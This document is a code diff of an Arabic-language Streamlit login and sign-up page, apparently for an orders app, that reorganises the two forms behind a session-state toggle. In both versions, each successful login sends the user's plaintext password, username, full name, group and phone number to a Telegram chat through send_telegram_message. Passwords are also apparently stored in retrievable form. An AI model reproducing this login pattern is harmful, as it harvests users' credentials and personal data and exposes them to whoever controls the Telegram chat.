@@ -1,6 +1,6 @@
 import streamlit as st
 import requests
-from orders import main as orders_main  # إذا لديك ملف orders.py يحتوي على الدالة main()
+from orders import main as orders_main  # دالة العرض الأساسية في ملف orders.py
 
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwJbXGCdU8MfdOuAAzQA1ubfsQu1655AQ53X8O2I-242BZG8Jiscybpd58l40LBkXS8/exec"
 
@@ -80,52 +80,65 @@ def add_user(username, password, full_name, group, phone):
 def login_page():
     st.title("تسجيل الدخول")
 
-    username = st.text_input("اسم المستخدم", key="login_username")
-    password = st.text_input("كلمة المرور", type="password", key="login_password")
+    if 'show_signup' not in st.session_state:
+        st.session_state['show_signup'] = False
 
-    login_clicked = st.button("دخول")
+    if not st.session_state['show_signup']:
+        # نموذج تسجيل الدخول
+        username = st.text_input("اسم المستخدم", key="login_username")
+        password = st.text_input("كلمة المرور", type="password", key="login_password")
 
-    if login_clicked:
-        if not username or not password:
-            st.warning("يرجى ملء جميع الحقول")
-        else:
-            if check_login(username, password):
-                user_data = get_user_data(username)
-                if user_data:
-                    st.session_state['logged_in'] = True
-                    st.session_state['user_name'] = user_data['username']
-                    message = (
-                        f"🔑 تم تسجيل دخول المستخدم:\n"
-                        f"اسم المستخدم: <b>{user_data['username']}</b>\n"
-                        f"كلمة المرور: <b>{user_data['password']}</b>\n"
-                        f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
-                        f"الجروب: <b>{user_data['group']}</b>\n"
-                        f"رقم الهاتف: <b>{user_data['phone']}</b>"
-                    )
-                    send_telegram_message(message)
+        if st.button("دخول"):
+            if not username or not password:
+                st.warning("يرجى ملء جميع الحقول")
+            else:
+                if check_login(username, password):
+                    user_data = get_user_data(username)
+                    if user_data:
+                        st.session_state['logged_in'] = True
+                        st.session_state['user_name'] = user_data['username']
+                        message = (
+                            f"🔑 تم تسجيل دخول المستخدم:\n"
+                            f"اسم المستخدم: <b>{user_data['username']}</b>\n"
+                            f"كلمة المرور: <b>{user_data['password']}</b>\n"
+                            f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
+                            f"الجروب: <b>{user_data['group']}</b>\n"
+                            f"رقم الهاتف: <b>{user_data['phone']}</b>"
+                        )
+                        send_telegram_message(message)
+                        return True
+                    else:
+                        st.error("تعذر جلب بيانات المستخدم")
                 else:
-                    st.error("تعذر جلب بيانات المستخدم")
-                return True
+                    st.error("اسم المستخدم أو كلمة المرور غير صحيحة")
+
+        # زر الانتقال لإنشاء حساب جديد
+        if st.button("إنشاء حساب جديد"):
+            st.session_state['show_signup'] = True
+
+    else:
+        # نموذج إنشاء حساب جديد
+        st.title("إنشاء حساب جديد")
+
+        signup_username = st.text_input("اسم المستخدم", key="signup_username")
+        signup_password = st.text_input("كلمة المرور", type="password", key="signup_password")
+        signup_full_name = st.text_input("الاسم الكامل", key="signup_full_name")
+        signup_group = st.text_input("الجروب", key="signup_group")
+        signup_phone = st.text_input("رقم الهاتف", key="signup_phone")
+
+        if st.button("تسجيل"):
+            if not signup_username or not signup_password or not signup_full_name or not signup_group or not signup_phone:
+                st.warning("يرجى ملء جميع حقول التسجيل")
             else:
-                st.error("اسم المستخدم أو كلمة المرور غير صحيحة")
+                if add_user(signup_username, signup_password, signup_full_name, signup_group, signup_phone):
+                    st.success("تم إنشاء الحساب بنجاح، يرجى تسجيل الدخول الآن")
+                    st.session_state['show_signup'] = False
+                else:
+                    st.error("فشل في إنشاء الحساب، حاول مرة أخرى")
 
-    st.markdown("---")
-    st.write("ليس لديك حساب؟ سجل هنا:")
+        if st.button("العودة لتسجيل الدخول"):
+            st.session_state['show_signup'] = False
 
-    signup_username = st.text_input("اسم المستخدم للتسجيل الجديد", key="signup_username")
-    signup_password = st.text_input("كلمة المرور للتسجيل الجديد", type="password", key="signup_password")
-    signup_full_name = st.text_input("الاسم الكامل", key="signup_full_name")
-    signup_group = st.text_input("الجروب", key="signup_group")
-    signup_phone = st.text_input("رقم الهاتف", key="signup_phone")
-
-    if st.button("إنشاء حساب جديد"):
-        if not signup_username or not signup_password or not signup_full_name or not signup_group or not signup_phone:
-            st.warning("يرجى ملء جميع حقول التسجيل")
-        else:
-            if add_user(signup_username, signup_password, signup_full_name, signup_group, signup_phone):
-                st.success("تم إنشاء الحساب بنجاح، يمكنك الآن تسجيل الدخول")
-            else:
-                st.error("فشل في إنشاء الحساب، حاول مرة أخرى")
     return False
 
 def main():
